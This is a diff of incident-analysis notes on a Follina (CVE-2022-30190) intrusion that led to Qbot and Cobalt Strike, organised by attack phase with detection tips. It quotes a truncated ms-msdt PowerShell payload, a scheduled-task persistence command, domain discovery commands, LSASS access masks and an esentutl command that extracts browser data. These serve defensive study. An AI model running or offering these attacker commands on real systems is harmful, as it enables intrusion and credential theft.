@@ -50,11 +50,11 @@ In this intrusion:
 
 ### Timeline
 
-![[Pasted image 20221127173533.png]]
+
 
 ### Infection graph
 
-![[Pasted image 20221127173743.png]]
+
 
 ## Step-by-step
 
@@ -71,7 +71,6 @@ These can be extracted as usual. An important file for the analysis of a Follina
 
 At the bottom of the retrieved HTML page, a script tag with malicious JavaScript code that called the `ms-msdt` scheme was found:
 
-![[Pasted image 20221127182022.png]]
 
 ```
 ms-msdt:/id PCWDiagnostic /skip force /param "IT_RebrowseForFile=? IT_LaunchMethod=ContextMenu IT_BrowseForFile=$(Invoke-Expression($(Invoke-Expression('[System.Text.Encoding]'+[char]58+[char]58+'Unicode.GetString([System.Convert]'+[char]58+[char]58+'FromBase64String('+[char]34
@@ -84,7 +83,7 @@ When a system is vulnerable to Follina (CVE-2022-30190), the code will be interp
 
 ***DETECTION***: monitor for this process (`msdt.exe`)  being spawned by a Microsoft Office application such as `WINWORD.EXE`
 
-In this case: payload contained base64-encoded PowerShell code --> #DETECTION decoded payload is also logged in EventID 4104 (script block logging) upon execution by the PowerShell engine.
+In this case: payload contained base64-encoded PowerShell code --> ***DETECTION*** decoded payload is also logged in EventID 4104 (script block logging) upon execution by the PowerShell engine.
 
 ### Execution
 
@@ -116,14 +115,62 @@ schtasks.exe /Create /F /TN "{E9ADEA37-C329-4967-9CF5-2682DA7D97BE}" /TR "cmd /c
 3. several connectivity checks were made to email relay services
 
 ### Defense Evasion
+- Process hollowing - 32-bit version of explorer.exe in suspended state
+- Analysis: Volatility and malfind module 
+- Checking injected PIDs and Volatility netscan module --> dicovery of Qbot and Cobalt strike
+- Various folders (dropzones for Qbot) were added as an exclusion for Windows Defender
 
 ### Credential access
+- attempt to steal credentials from the Credentials Manager --> ***Detection*** read operation on stored credentials in Credential Manager logged in Security logs
+- ***Detection*** following access levels are often linked to Credential dumping tools like Mimikatz
+- ***Detection*** significant amount of volume of events by explorer process for LSASS interacions with access right: 0x1FFFFF (PROCESS_ALL_ACCESS)
+```
+PROCESS_VM_READ (0x0010)
+PROCESS_QUERY_INFORMATION (0x0400)
+PROCESS_QUERY_LIMITED_INFORMATION (0x1000)
+PROCESS_ALL_ACCESS (0x1fffff)
+```
+
 
 ### Discovery
+- Discovery commands used by Qbot through injected process on beachhead system:
+```
+whoami /all
+cmd /c set
+net view /all
+ipconfig /all
+net share
+nslookup -querytype=ALL -timeout=12 _ldap._tcp.dc._msdcs.DOMAIN
+net localgroup
+netstat -nao
+route print
+net group /domain
+net group "Domain Computers" /domain
+C:\Windows\System32\cmd.exe /C c:\windows\sysnative\nltest.exe /domain_trusts /all_trusts
+```
+
+- Discovery commands from Cobalt Strike
+
+```
+net group "domain controllers" /dom
+net group "domain admins" /dom
+C:\Windows\system32\cmd.exe /C ping -n 1 <Redacted>
+```
+- `AdFind`
+- Network Scaner by SoftPerfect `netscan.exe` on the Domain Controller, downloaded using IE, used to port scan on TCP 445 and 3389
 
 ### Lateral Movement
+- DLLs for Qbot were sent from the beachhead host to other hosts on the network through SMB traffic
+- RDP to pivot between systems on the network (DC, file server)
+- ***Detection*** start of the `rdpclip.exe` by non-human account
 
 ### Collection
+- QBot collection modules on beachhead modules
+- `esentutl.exe` to extract browser data from IE and Edge
+```
+esentutl.exe /r V01 /l"C:\Users\<redacted>\AppData\Local\Microsoft\Windows\WebCache" /s"C:\Users\<redacted>\AppData\Local\Microsoft\Windows\WebCache" /d"C:\Users\<redacted>\AppData\Local\Microsoft\Windows\WebCache"
+```
+- `OpenWith` process for viewing PDF
 
 ### Command and Control
 
